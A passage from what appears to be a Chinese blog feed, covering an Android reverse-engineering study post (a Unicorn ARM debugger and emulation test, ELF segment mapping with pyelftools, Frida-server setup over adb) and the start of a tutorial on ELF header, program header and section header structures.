commands</span></span><br><span class="line"><span class="string">        # set reg &lt;regname&gt; &lt;value&gt;</span></span><br><span class="line"><span class="string">        # set bpt &lt;addr&gt;</span></span><br><span class="line"><span class="string">        # n[ext]</span></span><br><span class="line"><span class="string">        # s[etp]</span></span><br><span class="line"><span class="string">        # r[un]</span></span><br><span class="line"><span class="string">        # dump &lt;addr&gt; &lt;size&gt;</span></span><br><span class="line"><span class="string">        # list bpt</span></span><br><span class="line"><span class="string">        # del bpt &lt;addr&gt;</span></span><br><span class="line"><span class="string">        # stop</span></span><br><span class="line"><span class="string">        # a/t change arm/thumb</span></span><br><span class="line"><span class="string">        # f show ins flow</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (help_info)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">list_bpt</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self._list_bpt)):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[%d] %s&quot;</span> % (idx, self.sym_handler(self._list_bpt[idx])))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_bpt</span>(<span class="params">self, addr</span>):</span><br><span class="line">        self._list_bpt.append(addr)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">del_bpt</span>(<span class="params">self, addr</span>):</span><br><span class="line">        self._list_bpt.remove(addr)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_tracks</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self._tracks[-<span class="number">100</span>:-<span class="number">1</span>]:</span><br><span class="line">            <span class="comment">#print (self.sym_handler(i))</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self._tracks</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_default_sym_handler</span>(<span class="params">self, address</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(address)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_symbol_name_handler</span>(<span class="params">self, handler</span>):</span><br><span class="line">        self.sym_handler = handler</span><br></pre></td></tr></table></figure><p>将它放入Python库中，比如我放到了<code>C:\Users\v5le0n9\AppData\Local\Programs\Python\Python38\Lib\site-packages\unicorn</code>中，如果想要调用调试器直接在测试文件中导入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.UnicornDebugger <span class="keyword">import</span> *</span><br><span class="line">THUMB = <span class="string">b&quot;\x83\xb0\x83\xb0\x83\xb0&quot;</span></span><br><span class="line"><span class="comment"># sub    sp, #0xc</span></span><br><span class="line"><span class="comment"># sub    sp, #0xc</span></span><br><span class="line"><span class="comment"># sub    sp, #0xc </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_arm</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulate Thumb code&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Initialize emulator in ARM mode</span></span><br><span class="line">        mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># map 2MB memory for this emulation</span></span><br><span class="line">        ADDRESS = <span class="number">0x10000</span></span><br><span class="line">        mu.mem_map(ADDRESS, <span class="number">2</span> * <span class="number">0x10000</span>)</span><br><span class="line">        mu.mem_write(ADDRESS, THUMB)</span><br><span class="line"> </span><br><span class="line">        mu.reg_write(UC_ARM_REG_SP, <span class="number">0x1234</span>)</span><br><span class="line">        mu.reg_write(UC_ARM_REG_R2, <span class="number">0x6789</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#debugger attach</span></span><br><span class="line">        udbg = UnicornDebugger(mu)</span><br><span class="line">        udbg.add_bpt(ADDRESS)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># emulate machine code in infinite time</span></span><br><span class="line">        mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(THUMB))</span><br><span class="line">        r0 = mu.reg_read(UC_ARM_REG_SP)</span><br><span class="line">        r1 = mu.reg_read(UC_ARM_REG_R1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; SP = 0x%x&quot;</span> % r0)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; R1 = 0x%x&quot;</span> % r1)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_arm()</span><br></pre></td></tr></table></figure><p>在调试过程中，发现无名大佬写的调试器还是有些致命性的错误的，比如在执行n或s命令时，正常来说是执行一条汇编指令的，但这里执行了两条指令。而且指令执行完后SP的值并没有改变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;python unicorn_test.py</span><br><span class="line">Emulate Thumb code</span><br><span class="line">======================= Registers =======================</span><br><span class="line">R0=0x0  R1=0x0  R2=0x6789       R3=0x0</span><br><span class="line">R4=0x0  R5=0x0  R6=0x0  R7=0x0</span><br><span class="line">R8=0x0  R9=0x0  R10=0x0 R11=0x0</span><br><span class="line">R12=0x0 SP=0x1234       LR=0x0  PC=0x10000</span><br><span class="line">======================= Disassembly =====================</span><br><span class="line">0x10000:        sub     sp, #0xc</span><br><span class="line">0x10002:        sub     sp, #0xc</span><br><span class="line">0x10004:        sub     sp, #0xc</span><br><span class="line">0x10006:        movs    r0, r0</span><br><span class="line">0x10008:        movs    r0, r0</span><br><span class="line">0x1000a:        movs    r0, r0</span><br><span class="line">0x1000c:        movs    r0, r0</span><br><span class="line">0x1000e:        movs    r0, r0</span><br><span class="line">0x10010:        movs    r0, r0</span><br><span class="line">0x10012:        movs    r0, r0</span><br><span class="line">&gt;s</span><br><span class="line">======================= Registers =======================</span><br><span class="line">R0=0x0  R1=0x0  R2=0x6789       R3=0x0</span><br><span class="line">R4=0x0  R5=0x0  R6=0x0  R7=0x0</span><br><span class="line">R8=0x0  R9=0x0  R10=0x0 R11=0x0</span><br><span class="line">R12=0x0 SP=0x1234       LR=0x0  PC=0x10004</span><br><span class="line">======================= Disassembly =====================</span><br><span class="line">0x10004:        sub     sp, #0xc</span><br><span class="line">0x10006:        movs    r0, r0</span><br><span class="line">0x10008:        movs    r0, r0</span><br><span class="line">0x1000a:        movs    r0, r0</span><br><span class="line">0x1000c:        movs    r0, r0</span><br><span class="line">0x1000e:        movs    r0, r0</span><br><span class="line">0x10010:        movs    r0, r0</span><br><span class="line">0x10012:        movs    r0, r0</span><br><span class="line">0x10014:        movs    r0, r0</span><br><span class="line">0x10016:        movs    r0, r0</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h2 id="2-3-Unicorn调用so之加载模块"><a href="#2-3-Unicorn调用so之加载模块" class="headerlink" title="2.3 Unicorn调用so之加载模块"></a>2.3 Unicorn调用so之加载模块</h2><p>Android是基于Linux开发的，Android Native原生库是ELF文件格式。Unicorn 并不能加载ELF文件，所以我们要自己将ELF文件加载到Unicorn虚拟机的内存中去。 加载ELF 文件是一个很复杂的过程，涉及到ELF文件解析、重定位、符号解析、依赖库加载等。 </p><p>Python 可以使用elftools库解析ELF 文件。elftools安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyelftools</span><br></pre></td></tr></table></figure><h3 id="2-3-1-映射ELF文件"><a href="#2-3-1-映射ELF文件" class="headerlink" title="2.3.1 映射ELF文件"></a>2.3.1 映射ELF文件</h3><p>ELF 文件有两种视图，链接视图和执行视图。elftools 是基于链接视图解析ELF格式的，然而现在有一些ELF文件的section信息是被抹掉的。</p><p>加载ELF文件第一步需要将ELF文件映射到内存。如何映射呢？只需要找到类型为PT_LOAD的segment，按照segment的信息映射即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># - LOAD (determinate what parts of the ELF file get mapped into memory)</span></span><br><span class="line">load_segments = [x <span class="keyword">for</span> x <span class="keyword">in</span> elf.iter_segments() <span class="keyword">if</span> x.header.p_type == <span class="string">&#x27;PT_LOAD&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> segment <span class="keyword">in</span> load_segments:</span><br><span class="line">    prot = UC_PROT_ALL</span><br><span class="line">    self.emu.memory.mem_map(load_base + segment.header.p_vaddr, segment.header.p_memsz, prot)</span><br><span class="line">    self.emu.memory.mem_write(load_base + segment.header.p_vaddr, segment.data())</span><br></pre></td></tr></table></figure><h1 id="3-Frida"><a href="#3-Frida" class="headerlink" title="3. Frida"></a>3. Frida</h1><p>在Windows上安装好Frida-tools和Frida后，在安卓上安装Frida-server。</p><p>首先要准备好你的安卓机，真机、模拟器都可以，还需要<a href="https://blog.csdn.net/weixin_44903147/article/details/104065844">adb工具包</a>。使用adb查看和连接安卓设备，查看安卓设备的架构类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Downloads\platform-tools_r33.0.2-windows&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">192.168.24.101:5555     device</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\v5le0n9\Downloads\platform-tools_r33.0.2-windows&gt;adb shell</span><br><span class="line">vbox86p:/ # getprop ro.product.cpu.abi</span><br><span class="line">x86</span><br><span class="line">vbox86p:/ #</span><br></pre></td></tr></table></figure><p>查看Frida在Windows上的版本，从 <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a> 下载对应Frida版本和对应安卓架构的Frida-server。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9&gt;frida --version</span><br><span class="line">15.2.2</span><br></pre></td></tr></table></figure><p><a href="https://github.com/frida/frida/releases/download/15.2.2/frida-server-15.2.2-android-x86.xz">frida-server-15.2.2-android-x86.xz</a></p><p>解压后进入到存放Frida-server目录，Shift + 右键打开Powershell。运行以下命令将Frida-server上传到安卓设备的/data/local/tmp目录下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\v5le0n9\Downloads&gt; adb push .\frida-server-15.2.2-android-x86 /data/local/tmp</span><br><span class="line">.\frida-server-15.2.2-android-x86: 1 file pushed, 0 skipped. 206.2 MB/s (46387888 bytes in 0.215s)</span><br><span class="line">PS C:\Users\v5le0n9\Downloads&gt;</span><br></pre></td></tr></table></figure><p>将安卓设备中的Frida-server赋予777权限并运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vbox86p:/ # cd /data/local/tmp</span><br><span class="line">vbox86p:/data/local/tmp # chmod 777 frida-server-15.2.2-android-x86</span><br><span class="line">vbox86p:/data/local/tmp # ./frida-server-15.2.2-android-x86</span><br></pre></td></tr></table></figure><p>在Powershell中输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>如果存在<code>android.process.acore</code>等信息表示Windows和安卓设备的Frida框架搭建成功。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;没想到吧，我又润来学安卓了。。。实习就是这样的啦，多点尝试。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>ELF文件格式</title>
    <link href="http://example.com/posts/187bfa35.html"/>
    <id>http://example.com/posts/187bfa35.html</id>
    <published>2022-07-28T14:18:08.185Z</published>
    <updated>2022-11-17T06:25:54.624Z</updated>
    
    <content type="html"><![CDATA[<p>Android是基于Linux开发的，所以了解ELF格式对学习Android逆向和Linux逆向是必不可少的。</p><p>可执行与可链接格式 （Executable and Linkable Format，ELF），常被称为 ELF格式，是一种用于可执行文件、目标代码、共享库和核心转储（core dump）的标准文件格式，一般用于类Unix系统，比如Linux，Macox等。ELF 格式灵活性高、可扩展，并且跨平台。比如它支持不同的字节序和地址范围，所以它不会不兼容某一特别的 CPU 或指令架构。这也使得 ELF 格式能够被运行于众多不同平台的各种操作系统广泛采纳。</p><span id="more"></span><h1 id="1-ELF文件类型"><a href="#1-ELF文件类型" class="headerlink" title="1. ELF文件类型"></a>1. ELF文件类型</h1><ul><li>可重定位文件（<code>.o</code>文件）：文件保存着代码和适当的数据，用来和其它文件一起创建一个可执行文件或者是一个共享目标文件。</li><li>可执行文件（<code>.out</code>文件）：包含二进制代码和数据，可直接被加载器加载执行。</li><li>共享目标文件（<code>.so</code>文件）：共享库，用于和其它共享目标文件或者可重定位文件一起生成共享目标文件或者和可执行文件一起创建进程映像。</li></ul><h1 id="2-ELF文件作用"><a href="#2-ELF文件作用" class="headerlink" title="2. ELF文件作用"></a>2. ELF文件作用</h1><p>ELF文件参与程序的链接(建立一个程序)和程序的执行(运行一个程序)，所以可以从不同的角度来看待ELF格式的文件：</p><ol><li><p>如果用于<strong>编译和链接</strong>（可重定位文件），则<strong>编译器和链接器</strong>将把ELF文件看作是节头表描述的节的集合，程序头表可选。</p></li><li><p>如果用于<strong>加载执行</strong>（可执行文件），则<strong>加载器</strong>则将把ELF文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头表可选。</p></li></ol><img src="/posts/187bfa35/2.1.1.png" class="" title="链接阶段和执行阶段"><h1 id="3-ELF文件格式"><a href="#3-ELF文件格式" class="headerlink" title="3. ELF文件格式"></a>3. ELF文件格式</h1><p>ELF文件由4部分组成，分别是ELF头（ELF header）、程序头表（Program header table）、节（Section）和节头表（Section header table）。实际上，一个文件中不一定包含全部内容，而且它们的位置也未必如图所示这样安排，只有ELF头的位置是固定的，其余各部分的位置、大小等信息由ELF头中的各项值来决定。</p><img src="/posts/187bfa35/3.1.1.jpeg" class="" title="ELF文件格式"><h2 id="3-1-ELF文件头"><a href="#3-1-ELF文件头" class="headerlink" title="3.1 ELF文件头"></a>3.1 ELF文件头</h2><p>ELF文件头描述了ELF文件的基本类型、地址偏移等信息，分为32bit和64bit两个版本，定义于Linux源码的<code>/usr/include/elf.h</code>文件中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_hdr</span>&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>e_ident[EI_NIDENT];<span class="comment">//ELF文件的描述，是一个16字节的标识，表明当前文件的数据格式、位数等【重要】</span></span><br><span class="line">  Elf32_Halfe_type;<span class="comment">//文件的标识字段标识文件的类型【重要】</span></span><br><span class="line">  Elf32_Halfe_machine;<span class="comment">//目标文件的体系结构</span></span><br><span class="line">  Elf32_Worde_version;<span class="comment">//目标文件的体系结构版本</span></span><br><span class="line">  Elf32_Addre_entry;<span class="comment">//程序的虚拟入口地址，如果文件没有对应的入口可以为0【重要】</span></span><br><span class="line">  Elf32_Offe_phoff;<span class="comment">//文件中程序头表的偏移(bytes)，如果文件没有该项，则应该为0【重要】</span></span><br><span class="line">  Elf32_Offe_shoff;<span class="comment">//文件中段表/节表的偏移(bytes)，如果文件没有该项，则应该为0【重要】</span></span><br><span class="line">  Elf32_Worde_flags;<span class="comment">//处理器相关的标志位，宏格式为EF_machine_flags比如EF_MIPS_PIC</span></span><br><span class="line">  Elf32_Halfe_ehsize;<span class="comment">//ELF文件头的大小(bytes)【重要】</span></span><br><span class="line">  Elf32_Halfe_phentsize;<span class="comment">//程序头表中单项的大小，表中每一项的大小相同</span></span><br><span class="line">  Elf32_Halfe_phnum;<span class="comment">//程序头表中的项数，也就是说程序头表的实际大小为ephentsize × e_phnum，如果文件中没有程序头表该项为0</span></span><br><span class="line">  Elf32_Halfe_shentsize;<span class="comment">//节表中单项的大小，表中每一项的大小相同</span></span><br><span class="line">  Elf32_Halfe_shnum;<span class="comment">//节表中项的数量</span></span><br><span class="line">  Elf32_Halfe_shstrndx;<span class="comment">//节表中节名的索引，如果文件没有该表则该项为SHN_UNDEF(0)</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>数据类型说明：</p><div class="table-container"><table><thead><tr><th>名称</th><th>大小</th><th>用途</th></tr></thead><tbody><tr><td>unsigned char</td><td>1</td><td>无符号小整数</td></tr><tr><td>Elf32_Half</td><td>2</td><td>无符号中等大小整数</td></tr><tr><td>Elf32_Word</td><td>4</td><td>无符号大整数</td></tr><tr><td>Elf32_Addr</td><td>4</td><td>无符号程序地址</td></tr><tr><td>Elf32_Off</td><td>4</td><td>无符号文件偏移</td></tr><tr><td>Elf32_Sword</td><td>4</td><td>有符号大整数</td></tr></tbody></table></div><p>64bit和32bit仅仅只是字长的区别，字段上没有实际上的差别。</p><p>某些成员的相关参数：</p><p><code>e_ident[EI_NIDENT]</code>：ELF文件的描述，是一个16字节的标识，表明当前文件的数据格式、位数等。</p><img src="/posts/187bfa35/3.1.2.png" class="" title="e_iden[EI_NIDENT]"><ul><li>前4字节为魔数，取值为固定的0x7F454C46，标记当前文件为一个ELF文件。</li><li>第5个字节表明当前文件类别：0表示非法，1表示32bit，2表示64bit。</li><li>第6个字节表明当前文件的数据排列方式：0表示非法，1表示小端，2表示大端。</li><li>第7个字节表明当前文件的版本：0表示未知，1表示当前版本。</li><li>第某个字节是<code>EI_PAD</code>的起点，即<code>e_ident[EI_PAD]</code>表明<code>e_ident</code>中未使用的字节的起点，未使用的字节会被初始化为0，解析ELF文件时需要忽略对应的字段。</li></ul><p><code>e_type</code>：文件的标识字段标识文件的类型。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>ET_NONE(0)</td><td>未知的文件格式</td></tr><tr><td>ET_REL(1)</td><td>可重定位文件</td></tr><tr><td>ET_EXEC(2)</td><td>可执行文件</td></tr><tr><td>ET_DYN(3)</td><td>共享目标文件</td></tr><tr><td>ET_CORE(4)</td><td>Core转储文件，比如程序crash后的转储文件</td></tr><tr><td>ET_LOPROC(0xff00)</td><td>特定处理器的文件标识</td></tr><tr><td>ET_HIPROC(0xffff)</td><td>特定处理器的文件标识</td></tr><tr><td>[ET_LOPROC, ET_HIPROC]</td><td>区间的值用来表示特定处理器的文件格式</td></tr></tbody></table></div><p><code>e_machine</code>：目标文件的体系结构。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>EM_NONE(0)</td><td>未知的处理器架构</td></tr><tr><td>EM_M32(1)</td><td>AT&amp;T WE 32100</td></tr><tr><td>EM_SPARC(2)</td><td>SPARC</td></tr><tr><td>EM_386(3)</td><td>Intel 80386</td></tr><tr><td>EM_68K(4)</td><td>Motorola 68000</td></tr><tr><td>EM_88K(5)</td><td>Motorola 88000</td></tr><tr><td>EM_860(6)</td><td>Intel 80860</td></tr><tr><td>EM_MIPS(7)</td><td>MIPS RS3000大端</td></tr><tr><td>EM_MIPS_RS4_BE(10)</td><td>MIPS RS4000大端</td></tr><tr><td>其他</td><td>预留</td></tr></tbody></table></div><h2 id="3-2-程序头表"><a href="#3-2-程序头表" class="headerlink" title="3.2 程序头表"></a>3.2 程序头表</h2><p>可执行文件或共享目标文件的程序头表是一个结构数组，每个元素描述了一个段或者系统准备程序执行所必需的其它信息。程序头表描述了ELF文件中Segment在文件中的布局，描述了OS该如何装载可执行文件到内存。程序头表的表项的描述如下，类似于ELF Header也有32和64位两个版本。但程序头表的相关字段偏移有些差别。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_phdr</span> &#123;</span></span><br><span class="line">Elf32_Word p_type;<span class="comment">//当前Segment的类型</span></span><br><span class="line">Elf32_Off p_offset;<span class="comment">//当前段相对于文件起始位置的偏移量</span></span><br><span class="line">Elf32_Addr p_vaddr;<span class="comment">//段的第一个字节将被映射到到内存中的虚拟地址</span></span><br><span class="line">Elf32_Addr p_paddr;<span class="comment">//此成员仅用于与物理地址相关的系统中</span></span><br><span class="line">Elf32_Word p_filesz;<span class="comment">//段在文件映像中所占的字节数，可能为 0</span></span><br><span class="line">Elf32_Word p_memsz;<span class="comment">//段在内存映像中占用的字节数，可能为 0</span></span><br><span class="line">Elf32_Word p_flags;<span class="comment">//段相关的标志</span></span><br><span class="line">Elf32_Word p_align;<span class="comment">//段在文件中和内存中如何对齐</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf64_phdr</span> &#123;</span></span><br><span class="line">Elf64_Word p_type;</span><br><span class="line">Elf64_Word p_flags;</span><br><span class="line">Elf64_Off p_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">Elf64_Addr p_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">Elf64_Addr p_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">Elf64_Xword p_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">Elf64_Xword p_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">Elf64_Xword p_align;<span class="comment">/* Segment alignment, file &amp; memory */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><p>某些成员的相关参数：</p><p><code>p_type</code>：当前Segment的类型。</p><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>PT_NULL(0)</td><td>当前项未使用，项中的成员是未定义的，需要忽略当前项</td></tr><tr><td>PT_LOAD(1)</td><td>当前Segment是一个可装载的Segment，即可以被装载映射到内存中，其大小由<code>p_filesz</code>和<code>p_memsz</code>描述。如果<code>p_memsz &gt; p_filesz</code>则剩余的字节被置零，但是<code>p_filesz &gt; p_memsz</code>是非法的。动态库一般包含两个该类型的段：代码段和数据段</td></tr><tr><td>PT_DYNAMIC(2)</td><td>动态段、动态库特有的段，包含了动态链接必须的一些信息，比如需要链接的共享库列表、GOT等等</td></tr><tr><td>PT_INTERP(3)</td><td>当前段用于存储一段以NULL为结尾的字符串，该字符串表明了程序解释器的位置。且当前段仅仅对于可执行文件有实际意义，一个可执行文件中不能出现两个当前段</td></tr><tr><td>PT_NOTE(4)</td><td>用于保存与特定供应商或者系统相关的附加信息以便于兼容性、一致性检查，但是实际上只保存了操作系统的规范信息</td></tr><tr><td>PT_SHLIB(5)</td><td>保留段</td></tr><tr><td>PT_PHDR(6)</td><td>保存程序头表本身的位置和大小，当前段不能在文件中出现一次以上，且仅仅当程序头表为内存映像的一部分时起作用，它必须在所有加载项目之前</td></tr><tr><td>[PT_LPROC(0x70000000), PT_HIPROC(0x7fffffff)]</td><td>该范围内的值用作预留</td></tr></tbody></table></div><img src="/posts/187bfa35/3.2.1.png" class="" title="程序头表"><h2 id="3-3-节头表"><a href="#3-3-节头表" class="headerlink" title="3.3 节头表"></a>3.3 节头表</h2><p>节头表描述了ELF文件中的节的基本信息。可执行文件不一定有节头表但是一定有节，节头表可利用特殊的方式去除。节头表是也是一个结构数组，每个元素描述了不同的节。</p><p>段和节的区别是：</p><ul><li>段包含了程序装载可执行的基本信息，段告诉OS如何装载当前段到虚拟内存以及当前段的权限和执行相关的信息等，一个段可以包含0个或多个节；</li><li>节包含了程序的代码和数据等内容，链接器会将多个节合并为一个段。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_shdr</span> &#123;</span></span><br><span class="line">  Elf32_Wordsh_name;<span class="comment">//值是节名称在字符串表中的索引</span></span><br><span class="line">  Elf32_Wordsh_type;<span class="comment">//描述节的类型和语义</span></span><br><span class="line">  Elf32_Wordsh_flags;<span class="comment">//1bit位的标志位</span></span><br><span class="line">  Elf32_Addrsh_addr;<span class="comment">//如果当前节需要被装载到内存，则当前项存储当前节映射到内存的首地址，否则应该为0</span></span><br><span class="line">  Elf32_Offsh_offset;<span class="comment">//当前节的首地址相对于文件的偏移</span></span><br><span class="line">  Elf32_Wordsh_size;<span class="comment">//节的大小。但是对于类型为SHT_NOBITS的节，当前值可能不为0但是在文件中不占据任何空间</span></span><br><span class="line">  Elf32_Wordsh_link;<span class="comment">//存储节头表中的索引，表示当前节依赖于对应的节。对于特定的节有特定的含义，其他为SHN_UNDEF</span></span><br><span class="line">  Elf32_Wordsh_info;<span class="comment">//节的附加信息。对于特定的节有特定的含义，其他为0</span></span><br><span class="line">  Elf32_Wordsh_addralign;<span class="comment">//地址约束对齐，值应该为0或者2的幂次方，0和1表示未进行对齐</span></span><br><span class="line">  Elf32_Wordsh_entsize;<span class="comment">//某些节是一个数组，对于这类节当前字段给出数组中每个项的字节数，比如符号表。如果节并不包含对应的数组，值应该为0</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>某些成员的相关参数：</p><p><code>sh_type</code>：描述节的类型和语义。</p><div 